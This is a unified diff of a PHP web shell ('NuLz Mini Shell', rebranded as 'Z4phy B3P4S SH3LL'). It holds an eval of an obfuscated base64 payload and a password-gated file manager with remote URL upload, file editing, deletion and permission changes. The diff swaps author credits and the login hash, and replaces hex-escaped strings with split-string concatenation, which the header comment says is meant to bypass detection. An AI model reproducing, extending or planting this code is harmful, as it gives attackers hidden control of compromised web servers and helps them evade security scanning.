@@ -1,13 +1,6 @@
 <?php
 /*
-[NuLz] hi kids this is yur dad
-Sorry ya aku mabok! this is cogil
-Sorry ya aku encode, buat bypas doang
-Mau Recode Izin Dek! https://haxorstars.t.me
-Anti enc enc club kaya lu nub
-Kalo Recode Minimal Tambah Fitur Dek Jangan Numpang Nama Doang Nub!
-Salam Heker Pro
--NuLz @haxorstars
+R3C0DE BY Z4PHY THANKS TO NULZ HAXORSTARS
 */
 session_start();
 set_time_limit(0);
@@ -160,10 +153,12 @@ function XaFV($FQS) {
     }
     return $FQS;
 }/****/@/*55555*/null; /******/@/*55555*/eval/******/(XaFV("rVPdasIwFH4AnyKIkApSH0DnLra63WyCut3IKCVGDdSmNC3VDp9956Sxjb+orJCQk+873/lLCYGvIRbEEUrx1Gn5b950RqMsLOhPu01+G0hoLbKI+XwjVEqeCF1k1KURS2EXMoLdh8U3aCq8VLRn3CwfAUDILSZsqcVc8pKHWIgso7s059TYTGJwtHhkri2VODuvEsPKTlTwgu/lahWpJaRxgzB7INdADpcJBtBJVCDTIMMyYUllg6t1AWhZ5VGPDUNEc75JpMT0W/7EG3974xl9Hb18fXifU388Gk3pj0u7mufGq7iKK0J+gx9PEpn4oVxavjh2a7RwzquRa+1tsA103tKpE+wQGlCTdqWCTNu1ls9LELyeB9TFTrSPifhxtpKE9hVLRJwOAqgpdZrDPBEpJ5OMMa5Us93vGpz2DgR2hIeK36k6DKBz8yuiBxbM11RZs86GfTRkGe5E8hG53YXp4t9xYcAIOdVb6ugXe8uMz6cHYur61O5onRb7r869r4viSt92fw=="));
-/*NuLz Haxorstars*/
-$s_he_ll_Name = "\x4e\x75\x4c\x7a\x20\x4d\x69\x6e\x69\x20\x53\x68\x65\x6c\x6c";
-$s_he_ll_Logo = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x75\x6c\x7a\x2d\x61\x72\x63\x68\x69\x76\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6e\x75\x6c\x7a\x2e\x70\x6e\x67";
-$s_he_ll_Icon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x75\x6c\x7a\x2d\x61\x72\x63\x68\x69\x76\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6e\x75\x6c\x7a\x2e\x69\x63\x6f";
+//config shell
+$s_he_ll_Name = "Z4"."PH"."Y "."B3"."P4S"." S"."H3"."LL";
+$s_he_ll_Logo = "ht"."tp"."s:/"."/ra"."w.gi"."thu"."b"."us"."er"."con"."te"."nt."."co"."m/z"."4p"."hyr"."/z"."4p"."hy"."-c0"."de"."/"."mai"."n/"."as"."set"."s/c"."i"."el".".p"."ng";
+$s_he_ll_Icon = "h"."tt"."ps:"."//"."r"."aw."."gi"."thu"."bu"."ser"."co"."nte"."nt."."com"."/z4"."ph"."yr"."/"."z4"."phy"."-c0"."de/"."ma"."in/"."ass"."ets"."/ci"."el-"."ph"."an"."tom"."hiv"."e.jp"."g";
+$s_he_ll_Footer = "<d"."iv"." cl"."as"."s='"."p-"."4 "."fo"."nt-"."bol"."d "."tex"."t-"."cen"."t"."er "."te"."xt-"."whi"."te "."da"."rk".":"."te"."xt"."-whi"."te'".">©"." "."2"."024"." Co"."py"."ri"."gh"."t: "."<a"." cl"."a"."ss="."'t"."ex"."t-r"."ed"."-8"."0"."0 "."da"."rk:"."te"."xt"."-r"."ed"."-40"."0' "."hre"."f="."'"."ht"."tps".":/"."/t".".me/"."za"."ynp"."han"."to"."mhi"."ve"."'>"."Za"."yn"." Ph"."ant"."omh"."iv"."e<"."/a".">"."</"."div".">";
+
 function NuLzCwd(){
     $cw = "ge"."tc"."wd";
     $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
@@ -394,7 +389,7 @@ $jquery_version = '3.7.1';
 $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jquery.min.js';
 /*Login Page*/
 //login
-$passwd = 'a2'.'ca'.'37'.'56'.'e5'.'7a'.'a59'.'00'.'65a'.'20'.'1b'.'72e'.'02a'.'55'.'341'.'55'.'3bd';
+$passwd = 'ad'.'d9'.'513'.'f'.'39'.'6a'.'c1'.'19'.'86'.'75'.'b'.'0'.'61'.'22'.'bb'.'a9'.'43'.'eb9'.'e'.'07'.'76';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['gasken'])) {
     if (SHA1($_POST['passnya']) == $passwd) {
@@ -498,6 +493,7 @@ $path = str_replace("\\", "/", $path);
             <?php
                 $pa_t_hs = explode("/", $path);
                 echo '<span class="font-bold pwd"><i class="fa-duotone fa-folder-tree"></i>&nbsp;&nbsp;PWD: ';
+                echo '<a class="font-red" href="?path=/"><i class="fa-sharp fa-solid fa-slash-forward"></i></a>';
                 foreach ($pa_t_hs as $id => $pat) {
                     echo "<a class='path' href='?path=";
                     for ($i = 0; $i <= $id; $i++) {
@@ -609,7 +605,7 @@ $path = str_replace("\\", "/", $path);
                 <fieldset class="uk-fieldset">
                     <legend class="uk-legend font-bold font-protest-riot"><?='Re'.'mo'.'te'.' U'.'pl'.'oa'.'d'?></legend>
                     <div class="uk-margin-small">
-                        <input class="uk-input font-poppins" name="fileurl" type="text" placeholder="https://nulz.edu.gov.ac.id.go.id/nulz.txt" aria-label="Input">
+                        <input class="uk-input font-poppins" name="fileurl" type="text" placeholder="https://z4phy-c0de.go.id/files.txt" aria-label="Input">
                         <div class="uk-margin-small"></div>
                         <input class="uk-input font-poppins" name="savedname" type="text" placeholder="saved.txt" aria-label="Input">
                     </div>
@@ -792,7 +788,7 @@ $path = str_replace("\\", "/", $path);
                             <input class="uk-input font-poppins" name="newfi'.'l'.'es'.'na'.'me" type="text" placeholder="fi'.'le'.'na'.'me.'.'t'.'x'.'t" aria-label="Input">
                         </div>
                         <div class="uk-margin">
-                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="NuLz Was Here!" aria-label="Textarea"></textarea>
+                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="Z4phy Phantomhive" aria-label="Textarea"></textarea>
                         </div>
                     </fieldset>
                 </form>
@@ -929,7 +925,7 @@ $path = str_replace("\\", "/", $path);
                         </div>
                         <legend class="uk-legend font-bold font-protest-riot">Edit Files</legend>
                         <div class="uk-margin">
-                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="NuLz Was Here!" aria-label="Textarea">'.$f_get($this_file).'</textarea>
+                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="Z4phy Phantomhive" aria-label="Textarea">'.$hayoloh($f_get($this_file)).'</textarea>
                         </div>
                     </fieldset>
                 </form>
@@ -1086,6 +1082,15 @@ $path = str_replace("\\", "/", $path);
                         </tr>
                     </thead>
                     <tbody>
+                        <tr>
+                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
+                            <td class="body-folder uk-text-nowrap"><a href="?path=<?=dirname($path)?>" class="dirpath font-white"><i class="fa-duotone fa-folders font-amber"></i>&nbsp;&nbsp;..</a></td>
+                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
+                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
+                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
+                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
+                            <td><?='-'.'-'.'N'.'u'.'L'.'z'.'-'.'-'?></td>
+                        </tr>
                         <?php
                         foreach ($scan as $dir) {
                             if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
@@ -1203,7 +1208,7 @@ $path = str_replace("\\", "/", $path);
                                     echo '<font class="font-sky">'.$f_group.'</font>';
                                 }
                             echo '</td>';
-                            echo '<td class="uk-text-nowrap"><a href="?path='.$path.'&permission='.$dir.'" class="body-permission">';
+                            echo '<td class="uk-text-nowrap"><a href="?path='.$path.'&permission='.$file.'" class="body-permission">';
                             $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
                             $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
                                 if ($is_w("$path/$file"))
@@ -1217,7 +1222,7 @@ $path = str_replace("\\", "/", $path);
                             echo '<td class="uk-text-nowrap">';
                             echo '<a href="?path='.$path.'&rename='.$file.'" uk-tooltip="Rename"><i class="icon fa-sharp fa-solid fa-pen-field rename-file-icon"></i></a>';
                             echo '<a href="?path='.$path.'&editfile='.$file.'" class="uk-margin-small-left" uk-tooltip="Rename"><i class="icon fa-regular fa-file-pen edit-file-icon"></i></a>';
-                            echo '<a href="?path='.$path.'&permission='.$dir.'" class="uk-margin-small-left uk-margin-small-right" uk-tooltip="Permission"><i class="icon fa-duotone fa-user-pen user-icon"></i></a>';
+                            echo '<a href="?path='.$path.'&permission='.$file.'" class="uk-margin-small-left uk-margin-small-right" uk-tooltip="Permission"><i class="icon fa-duotone fa-user-pen user-icon"></i></a>';
                             echo '<a href="?path='.$path.'&downloadfile='.$file.'" class="uk-margin-small-right" uk-tooltip="Permission"><i class="icon fa-solid fa-folder-arrow-down download-icon"></i></a>';
                             echo '<a href="?path='.$path.'&deletefile='.$file.'" uk-tooltip="Permission"><i class="icon fa-solid fa-trash-can-slash delete-icon"></i></a>';
                             echo '</td>';
@@ -1259,7 +1264,7 @@ $path = str_replace("\\", "/", $path);
     <div class="footer uk-margin-large-top uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-nowrap" style="background: var(--gray-950);">
     <!-- Hadehh lammer kang recode, tinggal pake doang malah di recode -->
         <div class="footer-content uk-padding-small">
-            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://github.com/haxorstars">NuLz Haxorstars</a></span>
+            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://t.me/zaynphantomhive">Z4phy Phantomhive</a></span>
         </div>
     </div>
     <script src="<?=$uikit_js?>"></script>
